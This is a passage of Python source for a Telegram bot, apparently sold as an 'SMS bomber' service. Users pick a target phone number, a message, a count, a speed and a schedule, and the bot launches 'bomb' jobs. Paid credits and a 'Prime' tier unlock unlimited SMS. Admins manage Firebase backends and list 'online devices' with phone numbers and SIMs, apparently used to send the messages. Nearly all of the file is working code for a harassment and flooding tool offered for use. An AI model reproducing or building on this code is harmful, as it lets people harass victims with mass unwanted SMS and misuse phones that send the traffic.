async def bomb_schedule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END

    try:
        schedule_time = datetime.strptime(text, "%Y-%m-%d %H:%M")
    except ValueError:
        await update.message.reply_text("❌ Invalid format. Use `YYYY-MM-DD HH:MM`.", parse_mode=ParseMode.MARKDOWN)
        return SCHEDULE

    if schedule_time <= datetime.now():
        await update.message.reply_text("⚠️ Time must be in the future. Try again.")
        return SCHEDULE

    await launch_bomb(update, context, schedule_time=schedule_time)
    return ConversationHandler.END

async def launch_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE, schedule_time: datetime = None):
    user_id = update.effective_user.id
    chat = update.effective_chat
    msg_obj = update.message if update.message else update.callback_query.message

    target = context.user_data.get("target")
    message_text = context.user_data.get("message")
    count = context.user_data.get("sms_count")
    delay = context.user_data.get("delay", 0.1)

    # Validate access
    allowed, reason = can_send_sms(user_id, count)
    if not allowed:
        await msg_obj.reply_text(
            f"⚠️ {reason}\n\n👇 Buy Prime for unlimited SMS!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⭐ Buy Prime", callback_data="prime_back")]]),
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data.clear()
        return

    firebases = db_get_firebases()
    if not firebases:
        await msg_obj.reply_text("❌ No Firebase configured. Contact admin.")
        context.user_data.clear()
        return

    fb_ids = list(firebases.keys())
    job_id = str(uuid4())[:8]
    db_add_job(job_id, target, message_text, fb_ids, chat.id, count, delay, user_id)

    task = asyncio.create_task(execute_bomb_job(job_id, target, message_text, fb_ids, count, delay, user_id, schedule_time))
    running_jobs[job_id] = task

    sched_line = f"⏰ *Scheduled:* `{schedule_time.strftime('%Y-%m-%d %H:%M')}`" if schedule_time else "🚀 *Running now...*"
    await msg_obj.reply_text(
        "✅ *BOMB LAUNCHED!*\n"
        f"{LINE}\n"
        f"📦 Job ID: `{job_id}`\n"
        f"📞 Target: `{target}`\n"
        f"📨 SMS: {count} | ⚡ {delay}s delay\n"
        f"{sched_line}\n"
        f"{LINE}\n\n"
        "📊 Progress will show below ✨",
        parse_mode=ParseMode.MARKDOWN
    )
    context.user_data.clear()

async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled.")
    context.user_data.clear()
    return ConversationHandler.END

# ---------- COMMAND HANDLERS ----------
async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user(user_id)
    u = get_user(user_id) or {}
    prime = is_prime(user_id)
    prime_until = prime_until_str(user_id)
    free_left = max(0, FREE_TIER_LIMIT - (u.get("free_sms_used") or 0))
    text = (
        "💎 *YOUR WALLET*\n" + f"{LINE}\n" +
        f"👤 ID: `{user_id}`\n" +
        f"💳 Credits: *{u.get('credits', 0)}*\n" +
        f"🆓 Free SMS left: *{free_left}* / {FREE_TIER_LIMIT}\n" +
        (f"⭐ Prime: *Active until* `{prime_until}`\n" if prime else "⭐ Prime: *Inactive*\n") +
        f"{LINE}\n\n💡 Buy Prime for unlimited SMS!"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⭐ Buy Prime", callback_data="prime_back")]])
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user(user_id)
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <key>")
        return
    if db_redeem_key(args[0].strip(), user_id):
        u = get_user(user_id) or {}
        await update.message.reply_text(f"✅ Key redeemed! Credits: *{u.get('credits', 0)}*", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Invalid key, already used, or expired.")

async def addkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addkey <credits> <max_uses>"); return
    try:
        credits = int(args[0]); max_uses = int(args[1])
        if credits <= 0 or max_uses <= 0: raise ValueError
    except:
        await update.message.reply_text("❌ Positive integers required."); return
    k = generate_key_string()
    db_add_key(k, credits, max_uses, user_id)
    await update.message.reply_text(
        f"🔑 *KEY GENERATED*\n{LINE}\n🎟️ `{k}`\n💳 Credits: {credits}\n♻️ Max uses: {max_uses}\n{LINE}",
        parse_mode=ParseMode.MARKDOWN
    )

async def addprime_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /addprime <user_id> <days>"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addprime <user_id> <days>"); return
    try:
        target = int(args[0]); days = int(args[1])
        if days <= 0: raise ValueError
    except:
        await update.message.reply_text("❌ Invalid input."); return
    ensure_user(target)
    activate_prime(target, days)
    until = prime_until_str(target)
    await update.message.reply_text(f"⭐ Prime activated for `{target}` until `{until}`", parse_mode=ParseMode.MARKDOWN)

async def balance_alias(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await balance_command(update, context)

async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    jobs = db_get_jobs(limit=10, user_id=user_id)
    if not jobs:
        await update.message.reply_text("📜 No jobs found."); return
    text = "📜 *HISTORY*\n" + f"{LINE}\n\n"
    for j in jobs:
        emoji = {"pending":"⏳","running":"🔄","completed":"✅","failed":"❌","cancelled":"🚫","scheduled":"⏰"}.get(j["status"], "❓")
        text += f"{emoji} `{j['id']}` → `{j['target']}` ({j['status']})\n"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    jobs = db_get_jobs(limit=10, user_id=user_id)
    if not jobs:
        await update.message.reply_text("📊 No jobs yet."); return
    text = "📊 *STATUS REPORT*\n" + f"{LINE}\n\n"
    for j in jobs:
        emoji = {"pending":"⏳","running":"🔄","completed":"✅","failed":"❌","cancelled":"🚫","scheduled":"⏰"}.get(j["status"], "❓")
        text += (
            f"{emoji} `{j['id']}`\n"
            f"   🎯 `{j['target']}`\n"
            f"   📨 {j.get('total_sms',0)} | ✅ {j.get('success_count',0) or 0} | ❌ {j.get('fail_count',0) or 0}\n"
            f"   📌 *{j['status']}*\n{'─'*29}\n"
        )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def add_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return

    # Support bulk: reply to multiple URLs on separate lines
    raw = update.message.text.replace("/addfb", "", 1).strip()
    if not raw:
        await update.message.reply_text(
            "Usage:\n`/addfb https://project.firebaseio.com`\n\n"
            "Bulk (one per line):\n`/addfb\nhttps://p1.firebaseio.com\nhttps://p2.firebaseio.com`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    urls = [u.strip() for u in re.split(r'[\s\n,]+', raw) if u.strip()]
    added, failed = 0, 0
    results = []
    existing_count = len(db_get_firebases())
    for url in urls:
        if not url.startswith("http"):
            results.append(f"❌ `{url}` — invalid URL"); failed += 1; continue
        # Test
        try:
            async with get_http_semaphore():
                r = await get_http_client().get(url.rstrip("/") + "/.json?shallow=true")
            if r.status_code in (200, 401, 403):
                existing_count += 1
                fid = str(existing_count)
                db_add_firebase(fid, url, "")
                results.append(f"✅ `{fid}` — {url}")
                added += 1
            else:
                results.append(f"❌ HTTP {r.status_code} — `{url}`"); failed += 1
        except Exception as e:
            results.append(f"❌ `{url}` — {e}"); failed += 1
    await update.message.reply_text(
        f"📥 *Firebase import result*\n{LINE}\n"
        + "\n".join(results)
        + f"\n\n✅ Added: {added}   ❌ Failed: {failed}",
        parse_mode=ParseMode.MARKDOWN
    )

async def delete_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /deletefb <id>"); return
    fid = args[0].strip()
    if fid not in db_get_firebases():
        await update.message.reply_text(f"❌ Firebase {fid} not found."); return
    db_delete_firebase(fid)
    await update.message.reply_text(f"✅ Firebase {fid} deleted.")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return

    photo_file_id = None
    text = ""
    if update.message.photo:
        photo_file_id = update.message.photo[-1].file_id
        text = update.message.caption or ""
    else:
        raw = update.message.text.replace("/broadcast", "", 1).strip()
        text = raw

    if not text and not photo_file_id:
        await update.message.reply_text("Usage: /broadcast <message> or send photo with caption.")
        return

    conn = _connect(); c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    uids = [r[0] for r in c.fetchall()]
    conn.close()

    sent, fail = 0, 0
    for uid in uids:
        try:
            if photo_file_id:
                await BOT.send_photo(uid, photo_file_id, caption=text)
            else:
                await BOT.send_message(uid, text)
            sent += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"broadcast fail to {uid}: {e}"); fail += 1
    await update.message.reply_text(f"📢 Broadcast done.\n✅ {sent}   ❌ {fail}")

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🏓 Pong! *Bot online.*", parse_mode=ParseMode.MARKDOWN)

# ---------- CALLBACK ----------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    ensure_user(user_id)

    if data == "check_join":
        joined, missing = await check_channel_membership(user_id, BOT)
        if joined:
            await query.edit_message_text("✅ All channels joined! Welcome.")
            await send_main_menu(query.message, user_id)
        else:
            ch_list = "\n".join([f"• {ch}" for ch in missing])
            await query.edit_message_text(
                f"❌ Missing channels:\n{ch_list}\n\nJoin and click again.",
                reply_markup=get_join_keyboard(),
                parse_mode=ParseMode.MARKDOWN
            )
    elif data == "bomb_wizard":
        await bomb_start(update, context)
    elif data == "prime_back":
        await query.edit_message_text("Loading plans...")
        await show_prime_menu(query.message)
    elif data.startswith("prime_"):
        await prime_callback(update, context)
    elif data == "status":
        await status_command(update, context)
    elif data == "history":
        await history_command(update, context)
    elif data == "devices":
        await show_devices(query)
    elif data == "manage_fb":
        await manage_fb_menu(query)
    elif data.startswith("fb_delete_"):
        fid = data.split("_", 2)[2]
        db_delete_firebase(fid)
        await query.edit_message_text(f"✅ Firebase {fid} deleted.")
    elif data.startswith("fb_test_"):
        fid = data.split("_", 2)[2]
        fb = db_get_firebases().get(fid)
        if not fb:
            await query.edit_message_text("❌ Not found."); return
        try:
            async with get_http_semaphore():
                r = await get_http_client().get(fb["url"].rstrip("/") + "/.json?shallow=true")
            await query.edit_message_text(f"{'✅' if r.status_code in (200,401,403) else '❌'} Firebase {fid} — HTTP {r.status_code}")
        except Exception as e:
            await query.edit_message_text(f"❌ {e}")
    elif data == "back_main":
        await query.edit_message_text("🔙 Main menu", reply_markup=get_main_keyboard(user_id))
    else:
        await query.edit_message_text("Unknown action.")

async def show_devices(query):
    firebases = db_get_firebases()
    if not firebases:
        await query.edit_message_text("No Firebase."); return
    all_devices = []
    for fid, d in firebases.items():
        devs = await get_online_devices(d["url"])
        for x in devs:
            x["fb_id"] = fid
            all_devices.append(x)
    if not all_devices:
        await query.edit_message_text("📡 No online devices."); return
    text = "📡 *ONLINE DEVICES*\n" + f"{LINE}\n\n"
    for d in all_devices:
        text += (
            f"*{d['name']}* (FB: {d['fb_id']})\n"
            f"🆔 `{d['id']}`\n"
            f"📱 {d['phone']}\n"
            f"🔋 {d['battery']} | {len(d['sims'])} SIM(s)\n\n"
        )
    await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

async def manage_fb_menu(query):
    firebases = db_get_firebases()
    text = "⚙️ *FIREBASES*\n" + f"{LINE}\n\n"
    if not firebases:
        text += "No Firebase configured.\n"
    else:
        for fid, d in firebases.items():
            text += f"• `{fid}`: `{d['url']}`\n"
    text += "\nUse `/addfb` (bulk supported) or `/deletefb <id>`."
    await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

# ---------- BUTTON HANDLER ----------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    ensure_user(user_id, update.effective_user.first_name, update.effective_user.username)

    # Channel check
    if text not in ["/start", "/ping"]:
        joined, missing = await check_channel_membership(user_id, context.bot)
        if not joined:
            ch_list = "\n".join([f"• {ch}" for ch in missing])
            await update.message.reply_text(
                f"⚠️ *Join all channels first!*\n\n{ch_list}\n\nJoin and click ✅.",
                reply_markup=get_join_keyboard(),
                parse_mode=ParseMode.MARKDOWN
            )
            return

    # Awaiting redeem key
    if context.user_data.get("awaiting_redeem"):
        key = text.strip()
        if db_redeem_key(key, user_id):
            u = get_user(user_id) or {}
            await update.message.reply_text(f"🎟️ Key redeemed! Credits: *{u.get('credits',0)}*", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Invalid or expired key.")
        context.user_data.pop("awaiting_redeem", None)
        return

    if text == "💣 Launch Bomb":
        await bomb_start(update, context)
    elif text == "⭐ Buy Prime":
        await show_prime_menu(update.message)
    elif text == "💰 Balance":
        await balance_command(update, context)
    elif text == "📊 Status":
        await status_command(update, context)
    elif text == "📜 History":
        await history_command(update, context)
    elif text == "🔑 Redeem Key":
        context.user_data["awaiting_redeem"] = True
        await update.message.reply_text(
            "🔑 *REDEEM KEY*\n" + f"{LINE}\nSend your key:\nExample: `ABCD1234`",
            parse_mode=ParseMode.MARKDOWN
        )
    elif text == "📡 Online Devices" and user_id in ADMIN_IDS:
        firebases = db_get_firebases()
        if not firebases:
            await update.message.reply_text("No Firebase."); return
        all_devices = []
        for fid, d in firebases.items():
            devs = await get_online_devices(d["url"])
            for x in devs:
                x["fb_id"] = fid
                all_devices.append(x)
        if not all_devices:
            await update.message.reply_text("📡 No online devices."); return
        out = "📡 *ONLINE DEVICES*\n" + f"{LINE}\n\n"
        for d in all_devices:
            out += f"*{d['name']}* (FB: {d['fb_id']})\n🆔 `{d['id']}`\n📱 {d['phone']}\n🔋 {d['battery']}\n\n"
        await update.message.reply_text(out, parse_mode=ParseMode.MARKDOWN)
    elif text == "📊 Stats & History" and user_id in ADMIN_IDS:
        jobs = db_get_jobs(limit=10)
        total = len(jobs)
        sent = sum(j.get("success_count", 0) or 0 for j in jobs)
        fail = sum(j.get("fail_count", 0) or 0 for j in jobs)
        rate = round(sent / (sent+fail) * 100) if (sent+fail) else 0
        await update.message.reply_text(
            f"📊 *GLOBAL STATS*\n{LINE}\n📦 Jobs: {total}\n📨 Sent: {sent}\n❌ Fail: {fail}\n📈 Rate: {rate}%",
            parse_mode=ParseMode.MARKDOWN
        )
    elif text == "⚙️ Manage Firebases" and user_id in ADMIN_IDS:
        firebases = db_get_firebases()
        out = "⚙️ *FIREBASES*\n" + f"{LINE}\n\n"
        if not firebases:
            out += "None configured."
        else:
            for fid, d in firebases.items():
                out += f"• `{fid}`: `{d['url']}`\n"
        out += "\nUse `/addfb` (bulk) or `/deletefb <id>`."
        await update.message.reply_text(out, parse_mode=ParseMode.MARKDOWN)
    elif text == "🔑 Generate Key" and user_id in ADMIN_IDS:
        await update.message.reply_text(
            "🔑 Use `/addkey <credits> <max_uses>`\nExample: `/addkey 100 5`",
            parse_mode=ParseMode.MARKDOWN
        )

# ---------- MAIN ----------
def main():
    global BOT
    try:
        app = Application.builder().token(TOKEN).concurrent_updates(True).build()
        BOT = app.bot
        set_bot(BOT)

        conv = ConversationHandler(
            entry_points=[
                CallbackQueryHandler(bomb_start, pattern="^bomb_wizard$"),
                CommandHandler("bomb", bomb_start),
                MessageHandler(filters.Regex('^💣 Launch Bomb$'), bomb_start),
            ],
            states={
                TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_target)],
                MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_message)],
                SMS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_sms_count)],
                SPEED: [CallbackQueryHandler(bomb_speed, pattern="^speed_(slow|medium|fast|lightning)$")],
                SCHEDULE: [
                    CallbackQueryHandler(schedule_choice, pattern="^sched_(now|later)$"),
                    MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_schedule),
                ],
            },
            fallbacks=[CommandHandler("cancel", cancel_conv)],
            allow_reentry=True,
        )
        app.add_handler(conv)

        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_handler))

        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("ping", ping))
        app.add_handler(CommandHandler("balance", balance_command))
        app.add_handler(CommandHandler("redeem", redeem_command))
        app.add_handler(CommandHandler("addkey", addkey_command))
        app.add_handler(CommandHandler("addprime", addprime_command))
        app.add_handler(CommandHandler("history", history_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("cancel", cancel_conv))
        app.add_handler(CommandHandler("addfb", add_firebase_command))
        app.add_handler(CommandHandler("deletefb", delete_firebase_command))
        app.add_handler(CommandHandler("broadcast", broadcast_command))

        app.add_handler(CallbackQueryHandler(
            callback_handler,
            pattern="^(check_join|bomb_wizard|prime_back|prime_.+|status|history|devices|manage_fb|fb_delete_.+|fb_test_.+|back_main)$"
        ))

        logger.info("🔥 Premium Xipher Ultra Bot started.")
        app.run_polling(drop_pending_updates=True)
    except Exception as e:
        logger.error(f"❌ Failed to start: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
